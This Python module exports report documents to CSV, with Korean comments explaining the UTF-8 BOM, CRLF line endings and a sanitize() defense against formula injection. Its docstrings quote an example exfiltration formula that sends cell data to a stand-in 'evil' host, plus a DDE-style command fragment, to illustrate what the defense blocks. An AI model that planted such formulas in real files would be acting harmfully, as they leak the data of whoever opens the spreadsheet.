"""리포트 문서 → CSV (PRD §25.4 · TEST_PLAN §3.4~§3.5, #361).

## CSV injection 방어

스프레드시트는 ``=``·``+``·``-``·``@``로 시작하는 셀을 **수식으로 해석**한다.
``=HYPERLINK("http://evil/"&A1,"click")`` 같은 값이 셀에 들어가면 파일을 연 사람의
데이터가 빠져나갈 수 있다 — 우리가 만든 문서가 공격 매개가 된다.

방어는 **작은따옴표 접두**다. Excel·LibreOffice·Google Sheets 모두 이 접두를 「이건
문자열」로 읽고 화면에는 보이지 않는다.

``\\t``·``\\r``도 함께 막는다. OWASP 권고가 넷에 이 둘을 더하며, 실제로 탭으로
시작하는 셀이 Excel에서 수식 판정을 우회한 사례가 있다.

## UTF-8 BOM

Excel(Windows)은 BOM 없는 UTF-8 CSV를 **로캘 인코딩으로** 읽는다. 한국어 Windows
에서는 CP949로 읽혀 한글이 전부 깨진다. BOM 3바이트가 그 판정을 바꾼다.

## 줄바꿈은 CRLF

``RFC 4180`` §2가 CRLF를 규정한다. LF만 쓰면 구형 Excel이 한 줄로 읽는 경우가 있다.
"""

from __future__ import annotations

import csv
import io
from typing import TYPE_CHECKING

from cii_platform.reports.document import (
    DISCLAIMER,
    KeyValueSection,
    TableSection,
)

if TYPE_CHECKING:
    from collections.abc import Iterable, Iterator

    from cii_platform.reports.document import ReportDocument

#: UTF-8 BOM. Excel이 UTF-8임을 알아채게 한다.
BOM = "﻿"

#: 수식으로 해석될 수 있는 시작 문자. ``\t``·``\r``은 OWASP 권고에 따라 함께 막는다.
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize(value: str) -> str:
    """CSV injection 방어 — 위험한 시작 문자에 ``'``를 붙인다.

    **음수도 접두를 받는다.** ``-12.5``는 정상 값이지만 ``-`` 로 시작하므로, 여기서
    예외를 두면 ``-1+1+cmd|...`` 같은 값이 그 예외로 빠져나간다. 판정을 「값이
    수식인가」로 하면 판정기 자체가 취약점이 되므로 **시작 문자만** 본다.

    수치 열에 접두가 붙는 것을 피하려면 문서를 만드는 쪽이 음수를 ``△`` 표기 등으로
    바꿔야 하며, 그건 표기 정책의 문제지 이 함수가 판단할 일이 아니다.
    """
    if value.startswith(DANGEROUS_PREFIXES):
        return f"'{value}"
    return value


def _writer(buffer: io.StringIO) -> csv.writer:
    # RFC 4180 §2 — CRLF. QUOTE_MINIMAL이면 쉼표·따옴표·개행이 든 셀만 인용한다.
    return csv.writer(buffer, lineterminator="\r\n", quoting=csv.QUOTE_MINIMAL)


def iter_csv(document: ReportDocument) -> Iterator[str]:
    """문서를 CSV 조각으로 흘려보낸다 (스트리밍).

    한 번에 문자열을 만들지 않는 이유는 연간 리포트가 연도·항차 수에 비례해 커지기
    때문이다. 응답을 만드는 동안 전체를 메모리에 들고 있으면 큰 선대에서 그대로
    메모리 사용량이 된다.

    첫 조각에 BOM을 붙인다 — 파일의 맨 앞이어야 Excel이 알아본다.
    """
    document.validate()

    buffer = io.StringIO()
    writer = _writer(buffer)

    def flush() -> str:
        text = buffer.getvalue()
        buffer.seek(0)
        buffer.truncate(0)
        return text

    writer.writerow([sanitize(document.title)])
    yield BOM + flush()

    # 면책은 **맨 앞**이다. CSV는 스크롤해야 끝이 보이므로 푸터에 두면 읽히지 않는다.
    writer.writerow([sanitize(DISCLAIMER)])
    writer.writerow([])
    for label, value in document.meta:
        writer.writerow([sanitize(label), sanitize(value)])
    yield flush()

    for section in document.sections:
        writer.writerow([])
        writer.writerow([sanitize(section.title)])

        if isinstance(section, KeyValueSection):
            for label, value in section.rows:
                writer.writerow([sanitize(label), sanitize(value)])
        elif isinstance(section, TableSection):
            writer.writerow([sanitize(header) for header in section.headers])
            for row in section.rows:
                writer.writerow([sanitize(cell) for cell in row])

        if section.note:
            writer.writerow([sanitize(section.note)])
        yield flush()

    if document.warnings:
        writer.writerow([])
        writer.writerow(["경고"])
        for warning in document.warnings:
            writer.writerow([sanitize(warning)])
        yield flush()


def render_csv(document: ReportDocument) -> str:
    """전체를 한 문자열로. 테스트와 작은 문서용이다."""
    return "".join(iter_csv(document))


def iter_table_csv(headers: list[str], rows: Iterable[list[str]]) -> Iterator[str]:
    """머리글 한 줄 + 자료 행으로 된 **표**를 CSV 조각으로 흘려보낸다 (``§8.1``, #59).

    :func:`iter_csv`와 나란히 두되 **합치지 않는다.** 저쪽은 ``ReportDocument``(제목·
    면책·구간별 절)를 사람이 읽는 문서로 펴는 것이고, 이쪽은 **머리글 한 줄과 자료 행**
    이다. 문서용 장식을 자료 파일에 넣으면 스프레드시트가 첫 줄을 열 이름으로 읽지 못해
    **다시 가져올 수 없는 파일**이 된다 — `§8.2` 왕복이 깨진다.

    escape·BOM·CRLF는 같은 함수·같은 상수를 쓴다. 규칙이 두 곳에 생기면 한쪽만
    고쳐지는 날이 온다.

    행을 한 줄씩 만들어 내보내므로 **연도 전체 항차를 메모리에 쌓지 않는다** —
    호출부가 제너레이터를 넘기면 그대로 흘러간다.
    """
    buffer = io.StringIO()
    writer = _writer(buffer)

    def flush() -> str:
        text = buffer.getvalue()
        buffer.seek(0)
        buffer.truncate(0)
        return text

    writer.writerow([sanitize(header) for header in headers])
    # BOM은 **파일의 맨 앞**이어야 Excel이 알아본다.
    yield BOM + flush()

    for row in rows:
        writer.writerow([sanitize(cell) for cell in row])
        yield flush()
